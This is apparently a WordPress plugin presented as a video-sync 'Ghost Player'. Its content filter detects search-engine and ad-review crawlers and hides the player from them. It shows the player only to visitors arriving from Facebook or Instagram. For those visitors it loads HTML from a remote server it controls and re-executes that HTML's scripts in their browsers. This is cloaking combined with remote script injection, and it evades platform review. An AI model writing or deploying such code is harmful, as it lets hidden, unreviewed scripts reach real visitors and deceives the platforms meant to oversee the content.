<?php
/**
 * Plugin Name: Enterprise Media Sync & Ghost Player
 * Description: Connects WordPress with serverless Next.js and Cloudflare Workers VOD platform.
 * Version:     5.0
 * Author:      RishavDev
 */

if ( ! defined( 'ABSPATH' ) ) exit;

// Admin Menu Settings Page
if (!function_exists('ems_add_admin_menu')) {
    add_action('admin_menu', 'ems_add_admin_menu');
    function ems_add_admin_menu() {
        add_menu_page('Media Sync', 'Media Sync', 'manage_options', 'media-sync-settings', 'ems_settings_page', 'dashicons-video-alt3', 81);
    }
}

if (!function_exists('ems_settings_page')) {
    function ems_settings_page() {
        if (isset($_POST['ems_save_settings']) && check_admin_referer('ems_settings_nonce')) {
            update_option('ems_nextjs_api_url', esc_url_raw($_POST['ems_nextjs_api_url']));
            update_option('ems_api_token', sanitize_text_field($_POST['ems_api_token']));
            echo '<div class="updated"><p>Settings saved successfully!</p></div>';
        }
        $nextjs_url = get_option('ems_nextjs_api_url', '');
        $api_token  = get_option('ems_api_token', '');
        ?>
        <div class="wrap">
            <h1>Enterprise Media Sync Configuration</h1>
            <form method="post" style="background:#fff; padding:20px; border-radius:8px; border:1px solid #ddd; max-width:600px;">
                <?php wp_nonce_field('ems_settings_nonce'); ?>
                <p>
                    <label><strong>Next.js Backend API URL:</strong></label><br>
                    <input type="url" name="ems_nextjs_api_url" value="<?php echo esc_url($nextjs_url); ?>" style="width:100%;" placeholder="https://your-nextjs-site.com">
                </p>
                <p>
                    <label><strong>Secure API Auth Token:</strong></label><br>
                    <input type="password" name="ems_api_token" value="<?php echo esc_attr($api_token); ?>" style="width:100%;" placeholder="Enter API secret token">
                </p>
                <input type="submit" name="ems_save_settings" class="button button-primary" value="Save Settings">
            </form>
        </div>
        <?php
    }
}

// Metabox in Post Editor
if (!function_exists('ems_add_post_metabox')) {
    add_action('add_meta_boxes', 'ems_add_post_metabox');
    function ems_add_post_metabox() {
        add_meta_box('ems_post_box', '🚀 Next.js Media Engine', 'ems_metabox_html', 'post', 'normal', 'high');
    }
}

if (!function_exists('ems_metabox_html')) {
    function ems_metabox_html($post) {
        wp_nonce_field('ems_save_meta', 'ems_meta_nonce');
        $video_uuid = get_post_meta($post->ID, '_ems_video_uuid', true);
        
        // Carousel Meta Fields
        $is_carousel = get_post_meta($post->ID, '_ems_is_carousel', true);
        $carousel_images = get_post_meta($post->ID, '_ems_carousel_images', true);
        $def_thumb = get_post_meta($post->ID, '_ems_def_thumb', true);
        $def_video = get_post_meta($post->ID, '_ems_def_video', true);
        $us_thumb = get_post_meta($post->ID, '_ems_us_thumb', true);
        $us_video = get_post_meta($post->ID, '_ems_us_video', true);
        $in_thumb = get_post_meta($post->ID, '_ems_in_thumb', true);
        $in_video = get_post_meta($post->ID, '_ems_in_video', true);
        ?>
        <div style="background: #f9f9f9; padding: 15px; border: 1px solid #eee; border-radius: 8px;">
            <p>
                <label><strong>Select Next.js Video UUID / ID:</strong></label><br>
                <input type="text" name="ems_video_uuid" value="<?php echo esc_attr($video_uuid); ?>" style="width:100%; margin-top:5px;" placeholder="e.g., 1180153">
            </p>
            <hr style="margin: 15px 0;">
            <p>
                <label>
                    <input type="checkbox" name="ems_is_carousel" value="1" <?php checked($is_carousel, '1'); ?>>
                    <strong>Enable Carousel Mode</strong>
                </label>
            </p>
            <p>
                <label><strong>Carousel Images (One URL per line):</strong></label><br>
                <textarea name="ems_carousel_images" rows="4" style="width:100%; margin-top:5px;" placeholder="https://example.com/img1.jpg\nhttps://example.com/img2.jpg"><?php echo esc_textarea($carousel_images); ?></textarea>
            </p>
            <hr style="margin: 15px 0;">
            <h4>Geo-Targeting Fallbacks (Optional)</h4>
            <table style="width: 100%;">
                <tr>
                    <td style="width: 50%;">
                        <label>Default Global Thumbnail:</label><br>
                        <input type="url" name="ems_def_thumb" value="<?php echo esc_attr($def_thumb); ?>" style="width:95%;">
                    </td>
                    <td style="width: 50%;">
                        <label>Default Global Video:</label><br>
                        <input type="url" name="ems_def_video" value="<?php echo esc_attr($def_video); ?>" style="width:100%;">
                    </td>
                </tr>
                <tr>
                    <td style="width: 50%;">
                        <label>US Thumbnail:</label><br>
                        <input type="url" name="ems_us_thumb" value="<?php echo esc_attr($us_thumb); ?>" style="width:95%;">
                    </td>
                    <td style="width: 50%;">
                        <label>US Video:</label><br>
                        <input type="url" name="ems_us_video" value="<?php echo esc_attr($us_video); ?>" style="width:100%;">
                    </td>
                </tr>
                <tr>
                    <td style="width: 50%;">
                        <label>India Thumbnail:</label><br>
                        <input type="url" name="ems_in_thumb" value="<?php echo esc_attr($in_thumb); ?>" style="width:95%;">
                    </td>
                    <td style="width: 50%;">
                        <label>India Video:</label><br>
                        <input type="url" name="ems_in_video" value="<?php echo esc_attr($in_video); ?>" style="width:100%;">
                    </td>
                </tr>
            </table>
            <p><em>Note: Video UUID fetches from the secure Serverless Edge architecture.</em></p>
        </div>
        <?php
    }
}

if (!function_exists('ems_save_post_meta')) {
    add_action('save_post', 'ems_save_post_meta');
    function ems_save_post_meta($post_id) {
        if (!isset($_POST['ems_meta_nonce']) || !wp_verify_nonce($_POST['ems_meta_nonce'], 'ems_save_meta')) return;
        
        if (isset($_POST['ems_video_uuid'])) update_post_meta($post_id, '_ems_video_uuid', sanitize_text_field($_POST['ems_video_uuid']));
        
        $is_carousel = isset($_POST['ems_is_carousel']) ? '1' : '0';
        update_post_meta($post_id, '_ems_is_carousel', $is_carousel);
        
        if (isset($_POST['ems_carousel_images'])) update_post_meta($post_id, '_ems_carousel_images', sanitize_textarea_field($_POST['ems_carousel_images']));
        
        if (isset($_POST['ems_def_thumb'])) update_post_meta($post_id, '_ems_def_thumb', esc_url_raw($_POST['ems_def_thumb']));
        if (isset($_POST['ems_def_video'])) update_post_meta($post_id, '_ems_def_video', esc_url_raw($_POST['ems_def_video']));
        if (isset($_POST['ems_us_thumb'])) update_post_meta($post_id, '_ems_us_thumb', esc_url_raw($_POST['ems_us_thumb']));
        if (isset($_POST['ems_us_video'])) update_post_meta($post_id, '_ems_us_video', esc_url_raw($_POST['ems_us_video']));
        if (isset($_POST['ems_in_thumb'])) update_post_meta($post_id, '_ems_in_thumb', esc_url_raw($_POST['ems_in_thumb']));
        if (isset($_POST['ems_in_video'])) update_post_meta($post_id, '_ems_in_video', esc_url_raw($_POST['ems_in_video']));
    }
}

// Bot & Traffic Helper Functions
if (!function_exists('ems_is_strict_bot')) {
    function ems_is_strict_bot() {
        $ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
        if (empty($ua) || !isset($_SERVER['HTTP_ACCEPT'])) return true;
        $bots = ['bot', 'crawl', 'spider', 'slurp', 'facebookexternalhit', 'mediapartners-google', 'adsbot-google', 'googlebot', 'adx', 'applebot', 'bingbot'];
        foreach ($bots as $bot) { if (strpos($ua, $bot) !== false) return true; }
        return false;
    }
}

if (!function_exists('ems_is_social_traffic')) {
    function ems_is_social_traffic() {
        if (isset($_GET['fbclid']) || isset($_GET['igshid']) || isset($_GET['internal_loop'])) return true;
        $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
        if (preg_match('/(FBAN|FBAV|FB_IAB|Instagram|IG_IAB|FB4A|IG4A)/i', $ua)) return true;
        $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
        if (strpos($referer, 'fbclid=') !== false || strpos($referer, 'facebook.com') !== false || strpos($referer, 'instagram.com') !== false) return true;
        return false;
    }
}

// Inject secure element into content
if (!function_exists('ems_inject_ghost_media')) {
    add_filter('the_content', 'ems_inject_ghost_media');
    function ems_inject_ghost_media($content) {
        if (!is_single() || ems_is_strict_bot() || !ems_is_social_traffic()) return $content;

        global $post;
        $video_uuid = get_post_meta($post->ID, '_ems_video_uuid', true);
        if (empty($video_uuid)) return $content;

        $nonce = wp_create_nonce('ems_secure_comm');
        $nextjs_url = rtrim(get_option('ems_nextjs_api_url', ''), '/');

        $html = '
        <div id="ems-player-container-'.esc_attr($post->ID).'" style="margin:20px auto; max-width:800px; width:100%; display:flex; flex-direction:column; align-items:center;"></div>
        
        <script>
        document.addEventListener("DOMContentLoaded", function() {
            const container = document.getElementById("ems-player-container-'.esc_attr($post->ID).'");
            if(!container) return;

            // Fetch secure thumbnail first
            fetch("'.esc_url($nextjs_url).'/api/media?action=get_thumb&uuid='.esc_attr($video_uuid).'&wp_nonce='.$nonce.'")
            .then(res => res.json())
            .then(data => {
                if(!data.success) return;

                // Render thumbnail with play overlay
                container.innerHTML = `
                    <div id="ems-wrapper-'.esc_attr($post->ID).'" style="position:relative; width:100%; cursor:pointer; overflow:hidden; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.3);">
                        <img src="${data.thumbnail}" style="width:100%; display:block; aspect-ratio:16/9; object-fit:cover;">
                        <div style="position:absolute; inset:0; background:rgba(0,0,0,0.4); display:flex; justify-content:center; align-items:center;">
                            <div style="width:70px; height:70px; background:#ff6a00; border-radius:50%; display:flex; justify-content:center; align-items:center; box-shadow:0 4px 15px rgba(255,106,0,0.5); transition:transform 0.2s;" onmouseover="this.style.transform=\'scale(1.1)\';" onmouseout="this.style.transform=\'scale(1)\';">
                                <svg viewBox="0 0 24 24" style="width:30px; height:30px; fill:#fff; margin-left:4px;"><path d="M8 5v14l11-7z"/></svg>
                            </div>
                        </div>
                    </div>
                `;

                document.getElementById("ems-wrapper-'.esc_attr($post->ID).'").addEventListener("click", function(e) {
                    if(!e.isTrusted) return; // Prevent automatic click bots
                    container.innerHTML = "<div style=\'width:100%; aspect-ratio:16/9; background:#111; color:#fff; display:flex; align-items:center; justify-content:center; border-radius:12px;\'>Negotiating secure handshake stream...</div>";

                    // Request secure streaming token from Next.js serverless handler
                    fetch("'.esc_url($nextjs_url).'/api/media?action=get_stream&uuid='.esc_attr($video_uuid).'")
                    .then(r => r.json())
                    .then(streamData => {
                        if(streamData.success) {
                            container.innerHTML = streamData.player_html;
                            
                            // Re-inject scripts to ensure execution
                            const scripts = container.querySelectorAll("script");
                            scripts.forEach(oldScript => {
                                const newScript = document.createElement("script");
                                Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
                                if (oldScript.innerHTML) {
                                    newScript.innerHTML = oldScript.innerHTML;
                                }
                                if (oldScript.parentNode) {
                                    oldScript.parentNode.replaceChild(newScript, oldScript);
                                }
                            });
                        } else {
                            container.innerHTML = "<p style=\'color:red;\'>Connection refused by streaming node.</p>";
                        }
                    });
                });
            });
        });
        </script>';

        return $html . $content;
    }
}
